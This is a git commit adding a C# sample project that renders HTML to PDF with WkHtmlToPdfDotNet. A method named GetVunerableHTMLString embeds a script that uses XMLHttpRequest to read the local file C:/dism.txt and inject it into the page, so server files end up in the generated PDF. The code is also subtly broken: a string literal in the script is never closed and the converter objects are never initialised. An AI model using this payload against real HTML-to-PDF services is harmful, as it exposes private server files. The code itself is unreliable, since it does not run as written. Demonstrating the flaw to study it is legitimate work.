fef8b5d9b6ca75d770e1c746e24dd61d89423a4e
david <david.adele@hotmail.com>
2023-02-02 04:54:24 +0100

    Add project files.

---
+++ WKhtmltopdfSample/Program.cs
@@ -0,0 +1,101 @@
+﻿using WkHtmlToPdfDotNet;
+using BenchmarkDotNet.Attributes;
+using BenchmarkDotNet.Running;
+
+
+namespace WKhtmltopdfSample
+{
+    internal static class Program
+    {
+        static  BasicConverter bConverter ;
+        static  STASynchronizedConverter converter;
+
+        public static void Main(string[] args)
+        {
+            Setup();
+         // var summary = BenchmarkRunner.Run(typeof(Program).Assembly);
+            
+        }
+
+
+        public static void Setup()
+        {
+            var doc = new HtmlToPdfDocument()
+            {
+                GlobalSettings = {
+                    ColorMode = ColorMode.Grayscale,
+                    Orientation = Orientation.Portrait,
+                    PaperSize = PaperKind.A4,
+                    Margins = new MarginSettings() { Top = 10 },
+                },
+                Objects = {
+                    new ObjectSettings() {
+                          PagesCount = true,
+    HtmlContent = TemplateGenerator.GetVunerableHTMLString(),
+    WebSettings = { DefaultEncoding = "utf-8", UserStyleSheet =   Path.Combine(Directory.GetCurrentDirectory(), "assets",  "styles.css") },
+    HeaderSettings = { FontName = "Arial", FontSize = 9, Right = "Page [page] of [toPage]", Line = true },
+    FooterSettings = { FontName = "Arial", FontSize = 9, Line = true, Center = "Report Footer" }
+                    }
+                }
+            };
+
+            Task.Run(() => Action(doc));
+
+            var doc2 = new HtmlToPdfDocument()
+            {
+                GlobalSettings = {
+                    PaperSize = PaperKind.A4Small
+                },
+
+                Objects = {
+                    new ObjectSettings()
+                    {
+                        Page = "https://softdevplus.com/",
+                    }
+                }
+            };
+
+
+            Task.Run(() => Action(doc2));
+
+            Task.Run(() => Basic(doc));
+
+            Console.ReadKey();
+        }
+
+        [Benchmark(Description = "MultiThreading using BlockingCollections")]
+        private static void Action(HtmlToPdfDocument doc)
+        {
+            byte[] pdf = converter.Convert(doc);
+
+            if (!Directory.Exists("Files"))
+            {
+                Directory.CreateDirectory("Files");
+            }
+
+            using (FileStream stream = new FileStream(@"Files\" + DateTime.UtcNow.Ticks.ToString() + ".pdf", FileMode.Create))
+            {
+                stream.Write(pdf, 0, pdf.Length);
+            }
+
+        }
+
+
+        [Benchmark(Description = "MultiThreading using Basic Collection")]
+        private static void Basic(HtmlToPdfDocument doc)
+        {
+            byte[] pdf = bConverter.Convert(doc);
+
+            if (!Directory.Exists("Files"))
+            {
+                Directory.CreateDirectory("Files");
+            }
+
+            using (FileStream stream = new FileStream(@"Files\" + DateTime.UtcNow.Ticks.ToString() + ".pdf", FileMode.Create))
+            {
+                stream.Write(pdf, 0, pdf.Length);
+            }
+
+        }
+    }
+}
---
+++ WKhtmltopdfSample/TemplateGenerator.cs
@@ -0,0 +1,32 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace WKhtmltopdfSample
+{
+    public static class TemplateGenerator
+    {
+        public static string GetVunerableHTMLString()
+        {
+            var sb = new StringBuilder();
+            sb.Append(@"<html>
+                <head>
+                </head>
+                <body>
+                  <div id=teste>hello from softdevplus<div>
+                </body>");
+            sb.Append(@"<script>
+                var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() { document.getElementById('teste')
+        .innerHTML=this.response;
+                };
+                xhttp.open('GET', 'file:\\\C:/dism.txt, true);
+                xhttp.send();
+              </script>
+            </html>");
+            return sb.ToString();
+        }
+    }
+}
